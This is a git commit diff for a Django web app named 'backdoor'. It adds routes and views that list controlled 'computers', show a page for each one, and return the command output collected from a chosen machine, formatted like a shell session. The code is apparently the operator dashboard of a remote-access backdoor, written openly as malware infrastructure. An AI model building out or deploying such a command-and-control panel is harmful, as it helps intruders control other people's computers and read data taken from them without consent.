48dc956394b807156d4fe480d77988f46418d9c9
ArmenG <armeng2007@gmail.com>
2022-06-14 12:46:44 -0700

    Worked on the server side and website

--- server/backdoor/urls.py
+++ server/backdoor/urls.py
@@ -3,5 +3,6 @@ from . import views
 
 urlpatterns = [
     path('', views.home, name="home"),
-
+    path('<pc_id>/', views.computer_detail, name="computer-detail"),
+    path("ajax/<pk>", views.ajax, name="ajax")
 ]
--- server/backdoor/views.py
+++ server/backdoor/views.py
@@ -1,7 +1,20 @@
 from django.shortcuts import render
-from django.http import JsonResponse
-from .models import Output
+from django.http import JsonResponse, HttpResponse
+from .models import Output, Computer
 
 def home(request):
-    return render(request, "backdoor/home.html")
+    context = {
+        'computers': Computer.objects.all()
+    }
+    return render(request, "backdoor/home.html", context)
 
+def computer_detail(request, pc_id):
+    computer = Computer.objects.all().filter(id=pc_id)[0]
+    return render(request, "backdoor/pc_detail.html", {'pc':computer})
+
+def ajax(request, pk):
+    data = ""
+    computer = Computer.objects.all().filter(id=pk)[0]
+    for output in Output.objects.all().filter(target=computer):
+        data += output.target.pc_name + ":~$ " + output.output
+    return JsonResponse({'data':data})
